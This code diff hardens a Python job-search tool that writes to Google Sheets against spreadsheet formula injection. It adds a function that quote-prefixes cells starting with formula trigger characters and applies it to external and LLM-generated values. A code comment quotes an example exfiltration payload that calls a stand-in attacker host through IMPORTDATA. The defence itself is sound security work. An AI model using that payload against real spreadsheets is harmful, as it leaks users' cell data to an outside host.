@@ -49,6 +49,30 @@ STANDARD_HEADERS = [
     "Company", "Title", "Country", "Location", "Contract", "Link",
 ]
 
+
+# ---------------------------------------------------------------------------
+# FORMULA-INJECTION DEFENSE (2026-07-01 security audit).
+#
+# Google Sheets evaluates any cell whose value starts with `=`, `+`, `-`, `@`
+# as a formula when `value_input_option="USER_ENTERED"`. Job titles / company
+# names / URLs from external sources are UNTRUSTED — a malicious posting
+# titled `=IMPORTDATA("attacker.com/steal?d="&A1)` would exfiltrate adjacent
+# cell data through Google's infrastructure.
+#
+# Defense: prefix any leading `=/+/-/@` with a single quote — Sheets treats
+# that as a text-literal marker (the apostrophe is NOT stored in the cell,
+# it just disables formula parsing for that cell). We keep USER_ENTERED
+# so URLs stay auto-hyperlinked and dates parse correctly.
+_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@")
+
+
+def _defuse_formula(value: str) -> str:
+    """If value starts with a Sheets formula-trigger char, prefix with '.
+    Cheap; safe; preserves auto-hyperlinking and date parsing on legit values."""
+    if value and value[0] in _FORMULA_TRIGGER_CHARS:
+        return "'" + value
+    return value
+
 # Top Matches dashboard schema. Trimmed 2026-06-24 per operator request: dropped
 # Rank (row order already conveys it) / Identity (Title + Company is already in
 # the next two cols) / Why (Sonnet reasoning is in the sheet's role tabs).
@@ -194,7 +218,9 @@ def _append_dicts(ws, dicts: list[dict[str, str]], dedup_id_field: str = "_id") 
         row = [""] * max_col
         for header_name, col_1based in header_map.items():
             if header_name in d:
-                row[col_1based - 1] = str(d[header_name])
+                # Defuse formula-injection before writing: external job titles
+                # like "=IMPORTDATA(...)" must be stored as text literals.
+                row[col_1based - 1] = _defuse_formula(str(d[header_name]))
         rows.append(row)
 
     start_row = _next_empty_row(ws)
@@ -406,7 +432,10 @@ def refresh_top_matches(
             row = [""] * max_col
             for name, col in header_map.items():
                 if name in payload:
-                    row[col - 1] = payload[name]
+                    # Defuse formula injection on the Top Matches payload too:
+                    # ranker.reasoning is LLM-generated text and could start
+                    # with `=` if the model quotes a formula-looking snippet.
+                    row[col - 1] = _defuse_formula(payload[name])
             rows.append(row)
 
         end_row = 1 + len(rows)
@@ -480,7 +509,9 @@ def refresh_summary(
         rows: list[list[str]] = []
 
         def add(metric: str, value=""):
-            rows.append([metric, str(value)])
+            # Defuse: metric labels are developer-controlled but 'value' may
+            # come from stat dicts that eventually include external strings.
+            rows.append([_defuse_formula(metric), _defuse_formula(str(value))])
 
         # ---- Health score (computed, rendered in PLAIN ENGLISH) ----
         grade, score_str, plain_status, issues = "?", "", "", []
